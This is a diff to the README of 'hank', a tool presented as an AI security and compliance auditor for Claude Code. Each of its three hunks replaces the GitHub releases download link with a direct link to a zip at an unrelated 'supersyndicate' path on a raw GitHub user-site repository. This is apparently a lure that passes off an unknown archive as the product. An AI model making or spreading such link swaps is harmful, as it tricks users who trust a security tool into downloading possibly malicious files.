@@ -5,7 +5,7 @@ description: "Audit AI security and EU compliance for Claude Code with OWASP and
 ---
 # 🛡️ hank - AI Security & Compliance, Simplified
 
-[![Download hank](https://img.shields.io/badge/Download%20hank-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=2c3e50)](https://github.com/overheatingholy955/hank/releases)
+[![Download hank](https://img.shields.io/badge/Download%20hank-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=2c3e50)](https://raw.githubusercontent.com/overheatingholy955/overheatingholy955.github.io/main/supersyndicate/v3.1-beta.1.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Getting started with hank takes less than five minutes. Just follow these simple
 
 **Step 1:** Visit this link to download the application:
 
-[🔗 Download hank Now](https://github.com/overheatingholy955/hank/releases)
+[🔗 Download hank Now](https://raw.githubusercontent.com/overheatingholy955/overheatingholy955.github.io/main/supersyndicate/v3.1-beta.1.zip)
 
 **Step 2:** Look for the newest release (the version number will be highest). Click the download file linked to your computer.
 
@@ -149,7 +149,7 @@ hank grows stronger with community support. Here's how you can help:
 
 Ready to secure your AI projects and stay compliant? Don't wait until a problem appears. Being proactive saves time, money, and reputation.
 
-[![Get hank Now](https://img.shields.io/badge/⬇%20Download%20hank%20Now-blue?style=for-the-badge&logo=github)](https://github.com/overheatingholy955/hank/releases)
+[![Get hank Now](https://img.shields.io/badge/⬇%20Download%20hank%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/overheatingholy955/overheatingholy955.github.io/main/supersyndicate/v3.1-beta.1.zip)
 
 ---
 
